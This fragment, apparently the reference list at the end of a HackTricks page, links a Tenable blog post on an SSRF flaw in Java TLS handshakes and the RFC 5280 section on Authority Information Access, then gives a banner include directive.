- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
